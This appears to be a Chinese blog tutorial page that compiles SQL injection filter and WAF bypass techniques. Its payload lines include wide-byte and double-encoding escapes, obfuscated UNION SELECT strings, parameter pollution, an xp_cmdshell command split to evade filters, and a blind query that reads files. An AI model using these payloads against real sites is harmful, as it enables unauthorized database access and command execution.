@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-157457995-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>
+      
+  SQL注入进阶 —— WAF绕过 &ndash; 春田花花学习会
+
+    </title>
+    
+    
+    <meta name="description" property="og:description" content="归纳前辈们绕过WAF的技巧。
+整理归纳前辈们绕过WAF的技巧。
+|blog under go1f.cc">
+    
+
+    <meta name="apple-mobile-web-app-title" content="春田花花学习会">
+    
+    
+    <link rel="icon" href="/favicon-64.png">
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+    <link rel="mask-icon" size="any" href="/pinned-icon.svg">
+    
+    
+    
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@">
+    <meta name="twitter:creator" content="@">
+    <meta name="twitter:title" content="SQL注入进阶 —— WAF绕过 | 春田花花学习会">
+    <meta name="twitter:description" content="归纳前辈们绕过WAF的技巧。
+整理归纳前辈们绕过WAF的技巧。|blog under go1f.cc">
+    <meta name="twitter:image" content="https://blog.go1f.cc/twitter-card.png">
+    
+
+
+    <link rel="stylesheet" href="/assets/syntax.css">
+    <link rel="stylesheet" href="/assets/primer-build.css">
+    <link rel="stylesheet" href="/assets/style.css">
+  </head>
+
+
+  <body class="bg-gray">
+    <div id="holy" class="container-lg bg-white h-100">
+
+      <div id="header" class="px-1 bg-white">
+        <nav class="UnderlineNav UnderlineNav--right px-2">
+  <a class="UnderlineNav-actions muted-link h2" href="https://blog.go1f.cc/">
+    春田花花学习会
+  </a>
+
+  
+  
+  <div class="UnderlineNav-body">
+    
+    
+    
+    <a class="UnderlineNav-item " href="/">
+      
+      <span>主页</span>
+    </a>
+    
+    
+    
+    
+    <a class="UnderlineNav-item " href="/blog/">
+      
+      <span>博客</span>
+    </a>
+    
+    
+  </div>
+  
+</nav>
+
+      </div>
+
+      <div role="main" id="main" class="holy-main markdown-body px-4 bg-white">
+        
+
+<div class="Subhead">
+  <div class="Subhead-heading">
+    <div class="h1 mt-3 mb-1">SQL注入进阶 —— WAF绕过</div>
+  </div>
+  <div class="Subhead-description">
+    
+
+
+<a href='/categories/web%E6%B8%97%E9%80%8F' class="muted-link">
+  <span class="Label Label--gray-darker">Web渗透</span>
+</a>
+
+
+
+<a href='/tags/sql%E6%B3%A8%E5%85%A5' class="muted-link">
+  <span class="Label Label--gray">SQL注入</span>
+</a>
+
+
+
+    
+    <div class="float-md-right">
+      <span title="Lastmod: 2020-02-27. Published at: 2020-02-22.">
+        
+          Lastmod: 2020-02-27
+        
+      </span>
+    </div>
+    
+  </div>
+</div>
+<article>
+  
+  <section class="pb-6 mb-3 border-bottom">
+    <p>归纳前辈们绕过WAF的技巧。</p>
+<p>整理归纳前辈们绕过WAF的技巧。</p>
+<h2 id="代码防护">代码防护</h2>
+<p><code>php_quteos_gpc on</code> ，php5.3舍弃，将GPC (Get/Post/Cookie) 的变量 反斜杠转义单引号、双引号、反斜杠 和 NULL字符</p>
+<p><code>magic_quotes_runtime on</code> ，php5.3舍弃，反斜杠转义引号，影响file_get_contents()、file()、fgets()、fwrite()、fread()、exec()、system()、passthru()等函数</p>
+<p><code>addslashes(string)</code>，同理转义。</p>
+<p>并强烈建议使用DBMS指定的转义函数，MySQL 使用 <code>mysqli_real_escape_string()</code>，PostgreSQL 使用 <code>pg_escape_string()</code></p>
+<p>​</p>
+<h2 id="单引号逃逸">单引号逃逸</h2>
+<h3 id="宽字节注入">宽字节注入</h3>
+<p>GBK等双字节编码绕过</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">mysql_set_charset(&#34;GBK&#34;);     //php5.5舍弃，7.0移除
+mysql_query(&#34;SET NAMES GBK&#34;); //或者 set names gbk
+
+$id=addslashes($id);
+</code></pre></div><p>在 <code>\</code> 即 <code>%5C</code> 的前面，添加一个字符，使符合GBK编码(占两位)，前结合为一个汉字。例如%DF%5C，</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">id=-1 %DF&#39; union select 1,2,3 --+&#39;
+// 得到：&#39;-1 運&#39; union select 1,2,3 --+
+</code></pre></div><p>注意浏览器可能将%DF中的%再次转义，此时需要抓包修改</p>
+<p>​</p>
+<h3 id="二次编码注入">二次编码注入</h3>
+<p>地址栏URL会由浏览器进行URL编码，到达中间件进行一次URL解码。</p>
+<p>这是程序逻辑错误引起的注入，若在<code>addslashes()</code>后使用 <code>urldecode()</code>，即可二次编码逃逸<code>addslashes()</code>。</p>
+<p><code>%2527</code>经过中间件URL编码已转义为<code>%27</code>，再经过<code>urldecode()</code>再次转义，变为<code>'</code>单引号。</p>
+<p>正确使用顺序为 <code>addslashes(urldecode($id));</code></p>
+<p>​</p>
+<h2 id="waf-绕过">WAF 绕过</h2>
+<h3 id="空格分割符">空格/分割符</h3>
+<p><strong>URL编码</strong></p>
+<pre><code>%00 %0a %09 %0d %a0 %20 %0c %0b
+</code></pre><p><strong>内联注释</strong></p>
+<p>注释符 <code>//、--、/**/、#、--+、-- - 、; 、--a</code></p>
+<p>内联注释，<code>/*! */</code>   <code>!</code>终止注释符，MySQL识别执行注释内语句。</p>
+<p><code>/*!50000 */</code>表示语句需在数据库5.00.00以上版本执行</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"> <span class="cm">/*</span><span class="cm">!select user()</span><span class="cm">*/</span>
+ <span class="cm">/*</span><span class="cm">!50000%55nIOn</span><span class="cm">*/</span><span class="cm">/*</span><span class="cm">bac</span><span class="cm">*/</span><span class="k">all</span><span class="cm">/*</span><span class="cm">*/</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="cm">/*</span><span class="cm">!%53eLecT</span><span class="cm">*/</span><span class="o">%</span><span class="mi">0</span><span class="n">a</span><span class="cm">/*</span><span class="cm">985bbc</span><span class="cm">*/</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span>
+</code></pre></div><p><strong>参数包围</strong></p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="err">{</span><span class="n">abc</span> <span class="n">value</span><span class="err">}</span><span class="err">、</span><span class="p">(</span><span class="p">)</span><span class="err">、</span><span class="o">`</span><span class="o">`</span>
+</code></pre></div><p><strong>参数前</strong></p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="o">!</span> <span class="o">@</span> <span class="o">~</span> <span class="o">-</span> <span class="o">+</span>
+</code></pre></div><p><strong>参数后</strong></p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="c1"># 浮点型
+</span><span class="c1"></span><span class="k">select</span> <span class="n">username</span> <span class="k">from</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="p">.</span><span class="k">union</span> <span class="k">select</span> <span class="mi">1</span>
+<span class="c1"># 指数型
+</span><span class="c1"></span><span class="k">select</span> <span class="n">username</span> <span class="k">from</span> <span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="n">E0union</span> <span class="k">select</span> <span class="mi">1</span>
+<span class="c1"># \N型
+</span><span class="c1"></span><span class="k">select</span> <span class="n">username</span> <span class="k">from</span> <span class="n">id</span><span class="o">=</span><span class="err">\</span><span class="n">Nunion</span> <span class="k">select</span> <span class="mi">1</span>
+</code></pre></div><h3 id="参数编码">参数编码</h3>
+<p><strong>多重URL编码</strong></p>
+<p>URL编码是经过中间件时会进行解码，而WAF会提前进行URL解码</p>
+<p><strong>16进制编码</strong></p>
+<p>hex()、conv(22,10,2)、char(97,98,99)</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">select</span> <span class="n">username</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="mi">0</span><span class="n">x737475706964</span><span class="p">;</span>
+<span class="k">select</span> <span class="n">username</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">username</span><span class="o">=</span><span class="kt">char</span><span class="p">(</span><span class="mi">97</span><span class="p">,</span><span class="mi">98</span><span class="p">,</span><span class="mi">99</span><span class="p">)</span><span class="p">;</span>
+</code></pre></div><p><strong>Unicode编码</strong></p>
+<ul>
+<li><strong>单引号:</strong> %u0027、%u02b9、%u02bc、 %u02c8、 %u2032、 %uff07、 %c0%27、 %c0%a7、 %e0%80%a7</li>
+<li><strong>空格：</strong>%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</li>
+<li><strong>左括号：</strong>%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</li>
+<li><strong>右括号：</strong>%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</li>
+</ul>
+<p>utf-7 utf-8 utf-32等</p>
+<p>​</p>
+<h3 id="逻辑符号">逻辑符号</h3>
+<pre><code>and, or, &amp;&amp;, ||, =, XOR, IS, NOT
+</code></pre><pre><code>&gt;=, &lt;=, &lt;&gt;, LIKE, BETWEEN,
+</code></pre><h3 id="白名单绕过">白名单绕过</h3>
+<p>基于应用层的白名单，可能造成 byapss</p>
+<p>例如WAF若将<code>admin dede install</code>等特殊目录作为白名单</p>
+<pre><code>news.php/admin?id=1 and 0
+news/..\news.php?id=1 and 0
+</code></pre><p>​</p>
+<h3 id="http参数污染">HTTP参数污染</h3>
+<p><strong>HPP(HTTP Parameter Polution)</strong> 重复参数污染</p>
+<pre><code>?uid=1&amp;uid=2&amp;uid=3
+</code></pre><p><strong>HPF(HTTP Parameter Fragment)</strong> HTTP分割注入</p>
+<pre><code>?a=1+union%0aselect%0d1,2--+
+?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--
+select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users—
+
+
+**关键字拆分**
+
+​```
+'se'+'lec'+'t'
+%S%E%L%E%C%T 1
+1.aspx?id=1;EXEC('ma'+'ster..x'+'p_cm'+'dsh'+'ell &quot;net user&quot;')
+id=1+(UnI)(oN)+(SeL)(EcT)
+​```
+
+
+</code></pre><p><strong>HPC(HTTP Parameter Contamination)</strong></p>
+<p>不同的Web服务器处理构造的特殊请求有不同的逻辑，<code>%、%00、[ 、+</code>等等</p>
+<p>​</p>
+<h3 id="分片传输">分片传输</h3>
+<p><a href="https://www.anquanke.com/post/id/169738">利用分块传输吊打所有WAF</a></p>
+<p><a href="https://github.com/c0ny1/chunked-coding-converter">Burp插件模块 Chunked coding converter</a></p>
+<h3 id="缓冲区溢出">缓冲区溢出</h3>
+<p>WAF多是C语言编写，C自身没有缓冲区保护机制</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">and</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="p">(</span><span class="k">Select</span> <span class="mi">0</span><span class="n">xA</span><span class="o">*</span><span class="mi">1000</span><span class="p">)</span><span class="o">+</span><span class="k">UnIoN</span><span class="o">+</span><span class="k">SeLeCT</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="nf">version</span><span class="p">(</span><span class="p">)</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="k">database</span><span class="p">(</span><span class="p">)</span><span class="p">,</span><span class="k">user</span><span class="p">(</span><span class="p">)</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">18</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">25</span><span class="p">,</span><span class="mi">26</span>
+</code></pre></div><p>​</p>
+<h2 id="filter">Filter</h2>
+<p><strong>等效函数</strong></p>
+<p><code>unhex() bin()</code>   ==&gt; <code>ascii()</code></p>
+<p><code>sleep()</code>   ==&gt;  <code>benchmark(100,pi()*pi())</code></p>
+<p><code>concat()</code>  ==&gt; <code>group_concat()</code>、<code>concat_ws()</code></p>
+<p><code>mid()</code>、 <code>substr()</code>  ==&gt; <code>left()</code>、 <code>right()</code> 、<code>substring()</code>、<code>STRCMP(1,1)、lpad()</code></p>
+<p><code>@@version</code>   ==&gt; <code>version()</code></p>
+<p><code>@@datadir</code>  ==&gt; <code>datadir()</code></p>
+<p><strong>Union屏蔽？</strong> 字符裁切逻辑，Boolean注入</p>
+<p><strong>Select 屏蔽？</strong> substr() strcmp()</p>
+<p><strong>Where屏蔽？</strong></p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">select</span> <span class="n">username</span><span class="p">,</span><span class="n">password</span> <span class="k">from</span> <span class="n">users</span> <span class="k">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span>
+<span class="k">select</span> <span class="n">username</span><span class="p">,</span><span class="n">password</span> <span class="k">from</span> <span class="n">users</span> <span class="k">group</span> <span class="k">by</span> <span class="n">username</span> <span class="k">having</span> <span class="n">username</span> <span class="k">like</span> <span class="sa"></span><span class="s1">&#39;</span><span class="s1">adm%</span><span class="s1">&#39;</span> 
+</code></pre></div><p><strong>If 屏蔽怎么盲注？</strong> <code>Case When Then</code>语句</p>
+<div class="highlight"><pre class="chroma"><code class="language-mysql" data-lang="mysql"><span class="k">select</span> <span class="n">username</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">id</span> <span class="o">=</span><span class="sa"></span><span class="s1">&#39;</span><span class="s1">1</span><span class="s1">&#39;</span> <span class="k">and</span> 
+<span class="p">(</span><span class="k">select</span> <span class="k">case</span> <span class="k">when</span> <span class="nf">substr</span><span class="p">(</span><span class="p">(</span><span class="k">select</span> <span class="nf">load_file</span><span class="p">(</span><span class="sa"></span><span class="s2">&#34;</span><span class="s2">C:/Tools/a.txt</span><span class="s2">&#34;</span><span class="p">)</span><span class="p">)</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="k">like</span> <span class="sa"></span><span class="s1">&#39;</span><span class="s1">%a%</span><span class="s1">&#39;</span> <span class="k">then</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="k">else</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="n">end</span><span class="p">)</span>
+</code></pre></div><p>​</p>
+<h2 id="参考阅读">参考阅读</h2>
+<p><a href="https://cloud.tencent.com/developer/article/1459288">WAF Bypass数据库特性（Mysql探索篇）</a></p>
+<p><a href="https://www.freebuf.com/news/193659.html">在HTTP协议层面绕过WAF</a></p>
+<p><a href="https://www.cnblogs.com/r00tgrok/p/sql_injection_bypassing_waf_and_evasion_of_filter.html">深入了解SQL注入绕过waf和过滤机制</a></p>
+<p><a href="https://www.exploit-db.com/papers/17934">Beyond SQLi: Obfuscate and Bypass</a></p>
+  </section>
+
+  <section>
+    
+      
+    
+  </section>
+</article>
+
+      </div>
+
+      <div id="side" class="pr-1 bg-white">
+        <aside class="pr-3">
+          
+  
+    <div id="toc" class="Box Box--blue mb-3">
+      <b>SQL注入进阶 —— WAF绕过</b><nav id="TableOfContents">
+  <ul>
+    <li><a href="#代码防护">代码防护</a></li>
+    <li><a href="#单引号逃逸">单引号逃逸</a>
+      <ul>
+        <li><a href="#宽字节注入">宽字节注入</a></li>
+        <li><a href="#二次编码注入">二次编码注入</a></li>
+      </ul>
+    </li>
+    <li><a href="#waf-绕过">WAF 绕过</a>
+      <ul>
+        <li><a href="#空格分割符">空格/分割符</a></li>
+        <li><a href="#参数编码">参数编码</a></li>
+        <li><a href="#逻辑符号">逻辑符号</a></li>
+        <li><a href="#白名单绕过">白名单绕过</a></li>
+        <li><a href="#http参数污染">HTTP参数污染</a></li>
+        <li><a href="#分片传输">分片传输</a></li>
+        <li><a href="#缓冲区溢出">缓冲区溢出</a></li>
+      </ul>
+    </li>
+    <li><a href="#filter">Filter</a></li>
+    <li><a href="#参考阅读">参考阅读</a></li>
+  </ul>
+</nav></div>
+  
+
+  
+    
+    
+      <div>
+        
+
+        
+
+        
+
+        
+          <a data-pocket-label="pocket" data-pocket-count="none" class="pocket-btn" data-lang="en"></a>
+          <script type="text/javascript">!function(d,i){if(!d.getElementById(i)){var j=d.createElement("script");j.id=i;j.src="https://widgets.getpocket.com/v1/j/btn.js?v=1";var w=d.getElementById(i);d.body.appendChild(j);}}(document,"pocket-btn-js");</script>
+        
+
+      </div>
+    
+  
+
+        </aside>
+      </div>
+
+      <div id="footer" class="pt-2 pb-3 bg-white text-center">
+        
+
+  <span class="text-small text-gray">
+    ©go1f 2020 &middot; 
+
+    Powered by the
+    <a href="https://github.com/qqhann/hugo-primer" class="link-gray-dark">Hugo-Primer</a> theme for
+    <a href="https://gohugo.io" class="link-gray-dark">Hugo</a>.
+  </span>
+
+
+      </div>
+    </div>
+
+    
+  </body>
+</html>
